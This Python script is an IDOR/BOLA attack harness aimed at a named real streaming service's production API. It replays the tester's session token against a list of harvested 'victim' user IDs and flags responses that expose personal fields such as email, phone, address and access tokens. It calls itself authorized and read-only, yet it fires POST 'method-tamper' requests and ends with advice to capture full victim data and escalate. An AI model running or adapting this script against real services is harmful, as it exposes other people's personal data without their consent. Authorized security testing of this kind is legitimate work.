#!/usr/bin/env python3
"""
IDOR / BOLA cross-account harness  (Phase 1 — needs 1 authorized session)

WHY: Unauthenticated probing can only prove the edge is 401 (good) or that an
endpoint returns data with no token (broken). A TRUE horizontal IDOR requires an
attacker session + a VICTIM ID returning the victim's data. This script performs
exactly that test, read-only, and records ONLY status/length + which PII field
NAMES appear (never persists PII values).

SETUP (authorized test account only):
  1. Log in to your own account; pull the session token from a real /v1/* request
     (Burp/DevTools). Abema-style: `Authorization: Bearer <token>` or a Cookie.
  2. Build a victim-ID wordlist: grep your historical URL harvest (gau/wayback)
     for object refs, e.g.  /v1/users/([A-Za-z0-9]{8,})  -> leaked_user_ids.txt
  3. Paste your token into AUTH_HEADER below, set IDS_FILE, run.

SAFETY: only your own account + leaked public IDs; no enumeration to pull a real
victim's PII; cap the scan; record no response bodies.
"""
import requests, re, sys, time, os

# >>> PUT YOUR AUTHORIZED SESSION TOKEN HERE <<<
AUTH_HEADER = {
    "Authorization": "Bearer [REDACTED_BEARER]",
    # cookie-based alternative:
    # "Cookie": "abema_token=__PASTE__",
}
H = {"User-Agent": "Mozilla/5.0", "Accept": "application/json", **AUTH_HEADER}

BASE = "https://api.abema.io"          # <-- change to your target's API base
IDS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        "..", "leaked_user_ids.txt")
IDS_FILE = os.path.abspath(IDS_FILE)

# read-only endpoints to test per victim id (add method-tamper rows)
TEMPLATES = [
    ("GET",  "/v1/users/{id}"),
    ("GET",  "/v1/users/{id}/channels"),
    ("GET",  "/v1/users/{id}/trialAvailable"),
    ("POST", "/v1/users/{id}"),        # method-tamper check
]

PII = re.compile(r'"(userId|user_id|uid|email|mail|name|userName|nickname|'
                 r'birthday|phone|tel|address|gender|avatar|icon|'
                 r'profileImage|premium|isPremium|paidMember|memberType|'
                 r'point|points|coin|token|accessToken)"', re.I)


def load_ids(limit=200):
    try:
        return [l.strip() for l in open(IDS_FILE, errors="ignore") if l.strip()][:limit]
    except FileNotFoundError:
        print(f"[!] IDS_FILE not found: {IDS_FILE}")
        sys.exit(1)


def analyze(body):
    import json
    try:
        j = json.loads(body)
    except Exception:
        return False, []
    return True, sorted(set(PII.findall(json.dumps(j))))


def main():
    if "__PASTE_YOUR_TOKEN_HERE__" in (AUTH_HEADER.get("Authorization", "") or
                                        AUTH_HEADER.get("Cookie", "")):
        print("[!] No auth token set. Edit AUTH_HEADER, then re-run.")
        sys.exit(2)

    ids = load_ids()
    print(f"Loaded {len(ids)} victim IDs. Replaying against YOUR session...\n")
    findings, tested = [], 0
    for uid in ids:
        for method, tpl in TEMPLATES:
            url = BASE + tpl.replace("{id}", uid)
            try:
                r = requests.request(method, url, headers=H, timeout=8,
                                     allow_redirects=False)
            except Exception:
                continue
            tested += 1
            _, hits = analyze(r.text)
            if 200 <= r.status_code < 300 and hits:
                print(f"  [HIT] {method} {tpl.replace('{id}', uid)} "
                      f"-> {r.status_code} {len(r.content)}B fields={hits}")
                findings.append((method, tpl, hits))
        time.sleep(0.05)
    print(f"\nTested {tested} (method,endpoint) combos across {len(ids)} IDs.")
    print(f"Cross-account data-leak candidates: {len(findings)}")
    if findings:
        print("Next: capture FULL response w/ your session + a victim ID; confirm")
        print("returned userId/email != your own => true IDOR/BOLA. Add a 2nd")
        print("account to prove horizontal escalation; try method tampering.")


if __name__ == "__main__":
    main()
